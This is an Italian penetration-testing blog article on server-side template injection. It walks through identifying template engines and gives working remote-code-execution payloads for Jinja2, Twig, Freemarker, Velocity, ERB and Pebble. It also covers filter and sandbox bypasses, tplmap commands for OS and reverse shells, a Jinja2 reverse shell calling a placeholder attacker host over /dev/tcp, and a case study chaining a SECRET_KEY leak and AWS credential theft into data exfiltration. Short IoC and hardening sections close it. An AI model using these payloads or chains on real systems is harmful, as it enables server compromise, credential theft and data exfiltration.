---
title: 'SSTI (Server-Side Template Injection): RCE nei Template Engine Jinja2, Twig e Freemarker'
slug: ssti
description: 'Guida completa alla SSTI: come identificare Server-Side Template Injection, riconoscere il template engine e ottenere RCE con Jinja2, Twig o Freemarker.'
image: /ssti.webp
draft: false
date: 2026-03-15T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - ssti
  - injection-attacks
featured: true
---

I template engine sono ovunque nelle applicazioni moderne: Jinja2 per Flask/Django, Twig per Symfony/Laravel, Freemarker per Spring Boot, ERB per Ruby on Rails, Nunjucks per Express. Servono a generare HTML dinamico separando la logica dalla presentazione — e funzionano benissimo. Il problema sorge quando lo sviluppatore inserisce l'input dell'utente **dentro il template** anziché passarlo **come variabile al template**. Sembra una distinzione minima. La differenza è tra un sito web funzionante e un server completamente compromesso.

La **Server-Side Template Injection** (SSTI) si verifica esattamente in quel punto: l'input dell'utente viene trattato come codice del template, non come dato. Se scrivo `{{ "{{" }}7*7{{ "}}" }}` in un campo di input e la pagina mi mostra `49`, il template engine ha interpretato la mia espressione matematica. Se il template engine interpreta una moltiplicazione, può anche interpretare l'accesso a oggetti Python, chiamate a `Runtime.exec()` in Java, o la lettura di file di sistema. Da `{{ "{{" }}7*7{{ "}}" }}` a `{{ "{{" }}config.__class__.__init__.__globals__['os'].popen('id').read(){{ "}}" }}` il passo è breve — e il risultato è **RCE**.

La trovo nel **12% dei pentest su applicazioni Python/Node/Java**. Il dato che sorprende è che questa percentuale è in **crescita**: i microservizi con template per email, notifiche push, PDF e report personalizzati creano continuamente nuove superfici di attacco. Nel 2020 la trovavo nel 5% — è più che raddoppiata.

Satellite operativo della [guida pillar Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa).

## Cos'è la SSTI?

La Server-Side Template Injection è una vulnerabilità in cui l'input dell'utente viene inserito in un **template lato server** (Jinja2, Twig, Freemarker, Velocity, Pebble, ERB, EJS, Nunjucks) e interpretato come espressione del linguaggio del template. L'attaccante sfrutta le funzionalità del template engine — accesso a oggetti, chiamata metodi, esecuzione di codice — per leggere file, accedere a variabili d'ambiente e eseguire comandi sul sistema operativo.

> **La SSTI è pericolosa?**
> Sì — porta a **Remote Code Execution** nella maggior parte dei casi. I template engine moderni hanno accesso al runtime del linguaggio (Python, Java, PHP, Ruby) e l'attaccante può risalire dall'oggetto stringa alla classe `os` (Python) o a `Runtime` (Java). L'impatto è **RCE completa** sul server. Trovata nel **12% dei pentest** su stack Python/Node/Java, percentuale in crescita.

## Come Verificare se Sei Vulnerabile

```bash
# Shodan — errori template esposti
"Jinja2" "TemplateSyntaxError" port:80,443
"Twig" "error" port:80,443
"Freemarker" "template_exception" port:80,443
"UndefinedError" port:80,443

# Nuclei
nuclei -u https://target.com -tags ssti

# tplmap — tool dedicato alla SSTI
tplmap -u "https://target.com/page?name=test"
```

## Detection — Il Polyglot SSTI

Il primo passo è capire **se** il template engine valuta l'input e **quale** template engine è in uso. Il modo più efficiente è usare il "polyglot" — una stringa che contiene le sintassi di più engine:

```
${{ "{{" }}<%[%'"{{ "}}" }}%\.
```

Se la pagina va in errore → qualche template engine ha provato a interpretare la stringa. Ora restringi:

```
{{ "{{" }}7*7{{ "}}" }}    → 49?  → Jinja2, Twig, Nunjucks o simili
${7*7}     → 49?  → Freemarker, Velocity, Thymeleaf
<%= 7*7 %> → 49?  → ERB (Ruby) o EJS (Node.js)
#{7*7}     → 49?  → Pebble (Java) o Slim (Ruby)
```

### Mappa di Identificazione Dettagliata

```
Input: {{ "{{" }}7*7{{ "}}" }}
├── Output: 49
│   ├── Input: {{ "{{" }}7*'7'{{ "}}" }}
│   │   ├── Output: 7777777 → ✅ Jinja2 (Python)
│   │   ├── Output: 49      → ✅ Twig (PHP)
│   │   └── Output: 7777777 → ✅ Nunjucks (Node.js)
│   └── Input: {{ "{{" }}_self{{ "}}" }}
│       └── Output contiene "Twig" → ✅ Twig
├── Output: {{ "{{" }}7*7{{ "}}" }} (letterale)
│   └── Input: ${7*7}
│       ├── Output: 49 → Freemarker o Velocity
│       │   └── Input: ${7?upper_case}
│       │       └── Output: errore → ✅ Freemarker
│       └── Output: ${7*7} → prova altre sintassi
└── Output: errore
    └── Il template engine ha provato a interpretare → investiga
```

Questa mappa ti dice esattamente con quale engine hai a che fare, e ogni engine ha le sue chain di exploitation specifiche.

## Exploitation per Template Engine

### Jinja2 (Python — Flask, Django)

Jinja2 è il template engine più comune nelle applicazioni Python. L'exploitation si basa sul **traversal della gerarchia di classi Python** (Method Resolution Order — MRO) per raggiungere moduli come `os` o `subprocess`.

```python
# Step 1 — Conferma
{{ "{{" }}7*7{{ "}}" }}       → 49
{{ "{{" }}7*'7'{{ "}}" }}     → 7777777 (string multiplication → Jinja2!)

# Step 2 — Leggi configurazione Flask
{{ "{{" }}config{{ "}}" }}
{{ "{{" }}config.SECRET_KEY{{ "}}" }}

# Step 3 — Traversal MRO per trovare classi utili
{{ "{{" }}''.__class__.__mro__{{ "}}" }}
# → (<class 'str'>, <class 'object'>)
{{ "{{" }}''.__class__.__mro__[1].__subclasses__(){{ "}}" }}
# → lista di TUTTE le classi Python caricate

# Step 4 — Trova la classe Popen (per RCE)
# Cerca subprocess.Popen nella lista (spesso indice ~250-400)
{{ "{{" }}''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate(){{ "}}" }}

# Step 5 — Shortcut via config (Flask)
{{ "{{" }}config.__class__.__init__.__globals__['os'].popen('id').read(){{ "}}" }}

# Step 6 — Shortcut via request (Flask)
{{ "{{" }}request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read(){{ "}}" }}
```

**Reverse shell via Jinja2:**

```python
{{ "{{" }}config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read(){{ "}}" }}
```

### Twig (PHP — Symfony, Laravel)

```php
# Conferma
{{ "{{" }}7*7{{ "}}" }}     → 49
{{ "{{" }}7*'7'{{ "}}" }}   → 49 (non moltiplica stringhe → Twig, non Jinja2)
{{ "{{" }}_self{{ "}}" }}   → mostra info su Twig

# RCE (Twig < 3.x)
{{ "{{" }}_self.env.registerUndefinedFilterCallback("exec"){{ "}}" }}{{ "{{" }}_self.env.getFilter("id"){{ "}}" }}

# RCE (Twig 3.x) — via System
{{ "{{" }}['id']|filter('system'){{ "}}" }}

# File read
{{ "{{" }}'/etc/passwd'|file_excerpt(0,100){{ "}}" }}
```

### Freemarker (Java — Spring Boot)

```java
# Conferma
${7*7}      → 49

# RCE — Execute utility
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

# File read
<#assign file=object.class.forName("java.io.File")>
${file.getConstructor(String).newInstance("/etc/passwd")}

# RCE — ProcessBuilder
<#assign classLoader=object.class.getClassLoader()>
<#assign runtime=classLoader.loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null)>
${runtime.exec("id")}
```

### Velocity (Java)

```java
# Conferma
$class.inspect("java.lang.Runtime")

# RCE
#set($runtime = $class.inspect("java.lang.Runtime").type)
#set($getRuntime = $runtime.getMethod("getRuntime",null))
#set($invoke = $getRuntime.invoke(null,null))
$invoke.exec("id")
```

### ERB (Ruby on Rails)

```ruby
# Conferma
<%= 7*7 %>  → 49

# RCE
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read() %>
```

### Pebble (Java)

```java
# Conferma
{{ "{{" }} 7*7 {{ "}}" }}   → 49

# RCE (Pebble < 3.0.9)
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}
{{ "{{" }} bytes {{ "}}" }}
```

## Bypass Sandbox e Filtri

### Jinja2 — Bypass senza underscore

Se `_` è filtrato (il filtro più comune perché blocca `__class__`, `__mro__`, `__subclasses__`):

```python
# Via request
{{ "{{" }}request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f'){{ "}}" }}

# Via hex encoding
{{ "{{" }}''|attr('\x5f\x5fclass\x5f\x5f'){{ "}}" }}

# Via format string
{{ "{{" }}'%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95){{ "}}" }}
# → "__class__"
```

### Jinja2 — Bypass senza punto (.)

```python
# Via attr filter
{{ "{{" }}''|attr('__class__')|attr('__mro__'){{ "}}" }}

# Via bracket notation
{{ "{{" }}''['__class__']['__mro__']{{ "}}" }}
```

### Jinja2 — Bypass senza parentesi

```python
# Via Jinja2 filters
{{ "{{" }}''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(287).__init__.__globals__.__getitem__('os').popen('id').read(){{ "}}" }}
```

## tplmap — Automazione SSTI

```bash
# Detection e exploitation automatica
tplmap -u "https://target.com/page?name=test"

# Con POST data
tplmap -u "https://target.com/api" -d "name=test"

# Shell interattiva
tplmap -u "URL" --os-shell

# Comando singolo
tplmap -u "URL" --os-cmd "id"

# Reverse shell
tplmap -u "URL" --reverse-shell ATTACKER 4444
```

## 🏢 Enterprise Escalation

```
SSTI su Flask app → RCE nel container/pod
→ config.SECRET_KEY → forgia session cookie admin
→ /proc/self/environ → AWS_ACCESS_KEY_ID + SECRET
→ aws s3 ls → data exfiltration
→ o: service account Kubernetes → kubectl → cluster admin
```

**Tempo reale:** 30-60 minuti dalla prima `{{ "{{" }}7*7{{ "}}" }}` al cloud compromise.

La SSTI è particolarmente devastante nel cloud perché le applicazioni Flask/Django su Kubernetes hanno spesso accesso a credenziali cloud via service account o variabili d'ambiente.

## 🔌 Variante API / Microservizi 2026

Le SSTI nel 2026 si trovano soprattutto nei **microservizi che generano contenuto dinamico**:

```json
// Template email personalizzata
POST /api/v2/notifications/send
{"to": "user@example.com", "template": "welcome", "variables": {"name": "{{ "{{" }}config.SECRET_KEY{{ "}}" }}"}}

// Generazione PDF con template
POST /api/v2/reports/generate
{"template_body": "Gentile {{ "{{" }}7*7{{ "}}" }}, ecco il suo report", "data": {...}}

// Messaggi in-app
POST /api/v2/messages/preview
{"content": "Ciao ${7*7}, benvenuto!"}
```

## Micro Playbook Reale

**Minuto 0-3 →** Testa il polyglot su ogni campo: `${{ "{{" }}<%[%'"{{ "}}" }}%\.`
**Minuto 3-5 →** Se errore/49 → identifica il template engine con la mappa
**Minuto 5-10 →** Exploitation con chain specifica dell'engine
**Minuto 10-15 →** Reverse shell o lettura credenziali

**Shell in 15 minuti.**

## Caso Studio Concreto

**Settore:** E-commerce, Flask/Jinja2, 30.000 clienti.
**Scope:** Grey-box.

Il sito aveva una funzione "personalizza il tuo messaggio regalo" dove l'utente scriveva un testo che veniva renderizzato con Jinja2 per mostrare un'anteprima. Lo sviluppatore usava `render_template_string(f"<p>{user_message}</p>")` — SSTI classica.

`{{ "{{" }}7*7{{ "}}" }}` → 49 nel preview. `{{ "{{" }}config{{ "}}" }}` → SECRET\_KEY, DATABASE\_URI, MAIL\_PASSWORD. `{{ "{{" }}config.__class__.__init__.__globals__['os'].popen('id').read(){{ "}}" }}` → `uid=1000(flask)`.

Con la SECRET\_KEY ho forgiato un session cookie admin (Flask usa cookie firmati con la SECRET\_KEY). Login come admin → 30.000 clienti con dati personali e storico ordini. Dalla shell Flask, `cat /proc/self/environ` → credenziali AWS → S3 bucket con backup completo del database.

**Tempo dalla prima `{{ "{{" }}7*7{{ "}}" }}` alla shell:** 12 minuti. **Al cloud access:** 25 minuti.

## Errori Comuni Reali

**1. `render_template_string(user_input)` (Jinja2 — il pattern #1)**
Lo sviluppatore vuole renderizzare HTML dinamico con variabili utente e usa la funzione sbagliata.

**2. Template per email con variabili utente non escaped**
Il microservizio di notifica accetta il nome utente e lo inserisce nel template Jinja2/Twig dell'email senza escaping.

**3. CMS con template custom editabili**
L'utente admin può modificare i template del sito → SSTI da parte di un admin compromesso o un insider.

**4. PDF generator con template user-controlled**
Librerie come WeasyPrint, wkhtmltopdf, Puppeteer con template che contengono input utente.

**5. "È solo un preview" → ma il template engine è lo stesso**
La funzione di anteprima usa lo stesso engine della produzione — se accetta SSTI nel preview, l'impatto è reale.

## Indicatori di Compromissione (IoC)

* Payload SSTI nei log web: `{{`, `${`, `<%=`, `__class__`, `__mro__`, `__subclasses__`, `popen`, `exec`
* Errori `TemplateSyntaxError`, `UndefinedError`, `template_exception` nei log applicativi
* Accesso anomalo a `config`, `SECRET_KEY`, `/proc/self/environ` dai log
* Processi `bash`/`sh` figli del processo Python/Java/PHP
* Connessioni outbound dal web server dopo request contenenti payload template

## Mini Chain Offensiva Reale

```
SSTI {{ "{{" }}7*7{{ "}}" }} → {{ "{{" }}config{{ "}}" }} → SECRET_KEY → Forged Admin Cookie → Admin Panel → {{ "{{" }}os.popen('id'){{ "}}" }} → Shell → AWS Creds → S3 Exfiltration
```

## Detection & Hardening

* **Mai `render_template_string(user_input)`** — passa i dati come variabili: `render_template("page.html", name=user_input)`
* **Sandbox mode** — Jinja2 `SandboxedEnvironment`, Twig sandbox policy
* **Autoescaping** — abilitato di default in tutti i template engine
* **Template immutabili** — gli utenti non devono poter modificare i template
* **Principio minimo privilegio** — se il template non ha bisogno di accedere a `config`, non renderlo disponibile

***

Satellite della [Guida Completa Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [Command Injection](https://hackita.it/articoli/command-injection), [Expression Language Injection](https://hackita.it/articoli/expression-language-injection).

> I tuoi template engine valutano input utente? [Penetration test HackIta](https://hackita.it/servizi). Per padroneggiare la SSTI: [formazione 1:1](https://hackita.it/formazione).
